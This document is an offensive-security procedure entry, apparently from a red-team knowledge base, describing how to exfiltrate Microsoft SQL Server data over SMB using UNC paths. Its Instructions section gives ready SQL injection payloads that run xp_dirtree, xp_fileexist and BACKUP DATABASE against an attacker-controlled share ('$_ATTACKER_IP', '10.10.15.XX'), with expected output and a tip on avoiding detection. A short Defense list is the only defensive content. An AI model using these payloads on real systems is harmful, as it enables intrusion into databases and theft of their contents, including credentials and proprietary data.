---
id: 71630a0d-9ebd-40c9-b155-fa4c0de8aff8
name: MSSQL-UNC-Path-Out-of-Band-Data-Retrieval
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:34.044518+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Discovery|TA0007 - Discovery]]'
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
techniques:
  - >-
    [[techniques/Exfiltration Over Alternative Protocol|T1048 - Exfiltration
    Over Alternative Protocol]]
  - '[[techniques/Query Registry|T1012 - Query Registry]]'
sub_techniques: []
tags:
  - '[[tags/MSSQL-Injection]]'
  - '[[tags/MSSQL-Out-of-Band]]'
  - '[[tags/MSSQL-UNC-Path]]'
commands:
  - '[[commands/mssql-xp-dirtree-enumerate-unc-path]]'
  - '[[commands/mssql-backup-database-to-unc-path]]'
  - '[[commands/mssql-xp-fileexist-check-unc-path]]'
platforms:
  - Windows
  - SQL Server
tools: []
validated: true
---

# MSSQL-UNC-Path-Out-of-Band-Data-Retrieval

## Summary

This procedure demonstrates how to exfiltrate data from a Microsoft SQL Server (MSSQL) database using UNC paths over SMB when direct outbound connections are blocked by firewalls. It leverages SQL injection to execute extended stored procedures like xp_dirtree for directory enumeration and BACKUP commands to transfer database contents to an attacker-controlled SMB share, enabling out-of-band data retrieval in segmented networks.

## Description

In scenarios where an attacker has gained initial access to an MSSQL instance via SQL injection but cannot establish direct TCP connections for exfiltration (e.g., due to firewall rules blocking HTTP/HTTPS), UNC path injection provides a workaround by forcing the server to initiate SMB connections to an attacker-controlled endpoint. The technique starts with reconnaissance using xp_dirtree to map local directories or verify remote share accessibility, followed by using BACKUP DATABASE or BACKUP LOG to write database contents directly to the remote UNC path. This method is particularly effective against Windows-based SQL Servers with xp_cmdshell or extended procs enabled, allowing bypass of network restrictions while stealing sensitive data like credentials or proprietary information. Success depends on SMB port 445 being permitted outbound and the attacker hosting an SMB share to capture the incoming connections.

## Requirements

1. Valid SQL injection vulnerability in a web application connected to the MSSQL database, providing non-privileged or sysadmin-level access.
2. Outbound SMB (port 445) connections allowed from the SQL Server host to the attacker's network.
3. Attacker-controlled SMB share set up to listen for incoming connections (e.g., using Impacket's smbserver.py).
4. Knowledge of the target database name (e.g., 'TESTING') and sufficient permissions to execute extended stored procedures (e.g., xp_dirtree) and BACKUP operations.
5. Tools like sqlmap or manual injection tools for delivering the payloads.

## Defense

- Implement strict input validation and prepared statements to prevent SQL injection in all database-interfacing applications.
- Disable unnecessary extended stored procedures (e.g., xp_dirtree, xp_fileexist) using sp_dropextendedproc and restrict sysadmin privileges.
- Block outbound SMB traffic (port 445) at the firewall, especially to untrusted networks, and monitor for anomalous SMB connections from database servers.
- Enable SQL Server auditing for extended proc executions and BACKUP operations, correlating with network logs for SMB exfil indicators.
- Use database activity monitoring (DAM) tools to alert on UNC path usage in queries.

## Objectives

1. Enumerate local or remote directories via UNC paths to confirm SMB accessibility and perform reconnaissance.
2. Exfiltrate database contents (full backups or logs) to an attacker-controlled share without direct network connections.
3. Bypass firewall restrictions on outbound protocols by leveraging SMB for data transfer.

## Instructions

### Step 1: Verify UNC Path Accessibility with Directory Enumeration

**Context**: Begin by injecting a payload to execute xp_dirtree on a UNC path pointing to your controlled SMB share. This confirms the server can reach your endpoint and lists share contents, providing reconnaissance on accessible directories without alerting typical web filters.

**Command** ([[commands/mssql-xp-dirtree-enumerate-unc-path]]):

Use a SQL injection payload to execute the command, replacing placeholders with your SMB share details.

**Code** ([[codes/mssql-sqli-xp-dirtree-remote-share]]):

```sql
1'; use master; exec xp_dirtree '\\$_ATTACKER_IP\$_SHARE_NAME';--
```

> This injection switches to the master database, executes xp_dirtree to enumerate the remote share, and comments out the rest of the query to avoid errors. Expected output includes a table with subdirectories and files on the share (e.g., id, name, parent columns showing structure). If successful, it indicates SMB connectivity; failures may show access denied or path not found.

### Step 2: Check File Existence on UNC Path

**Context**: Before attempting large exfiltrations, use xp_fileexist to verify if a specific file or path is writable or exists on the remote share, helping to test permissions and avoid noisy failures.

**Command** ([[commands/mssql-xp-fileexist-check-unc-path]]):

Inject the following via SQLi:

```sql
1'; use master; exec xp_fileexist '\\$_ATTACKER_IP\$_SHARE_NAME\test.txt';--
```

> The command returns a result set with FileExists (1 if exists, 0 otherwise), Path, and FileAttributes. Use this to probe writability by checking a test file you place on the share. Success confirms the path is reachable and potentially writable.

### Step 3: Exfiltrate Data Using Database Backup to UNC Path

**Context**: Once connectivity is confirmed, use BACKUP DATABASE or BACKUP LOG to dump the entire database or transaction logs directly to the UNC path. This transfers sensitive data over SMB, capturing it on the attacker's side without needing additional tools on the target.

**Command** ([[commands/mssql-backup-database-to-unc-path]]):

Inject the backup payload, specifying the target database and UNC path:

**Code** ([[codes/mssql-unc-path-exfiltration-commands]]):

```sql
BACKUP DATABASE [$_DATABASE_NAME] TO DISK = '\\$_ATTACKER_IP\$_SHARE_NAME\exfil.bak';
```

> For full database exfil, use BACKUP DATABASE; for incremental logs, use BACKUP LOG [$_DATABASE_NAME] TO DISK = '\\$_ATTACKER_IP\$_SHARE_NAME\log.trn'. Wrap in SQLi if needed: 1'; BACKUP DATABASE [TESTING] TO DISK = '\\10.10.15.XX\SHARE\data.bak'; --. Expected output: Processed X pages, completion messages. On the attacker side, the .bak or .trn file appears in the share, containing the dumped data for offline analysis or restoration.

### Step 4: Verify and Clean Up

**Context**: Optionally, use RESTORE VERIFYONLY to confirm the backup integrity remotely, or monitor the share for received files. Avoid repeated executions to minimize detection.

Inject verification:

```sql
RESTORE VERIFYONLY FROM DISK = '\\$_ATTACKER_IP\$_SHARE_NAME\exfil.bak';
```

> This checks the backup without restoring, returning verification status. Success: 'The backup set holds a backup of a DATABASE' with no errors. Retrieve the file from your SMB server for analysis.
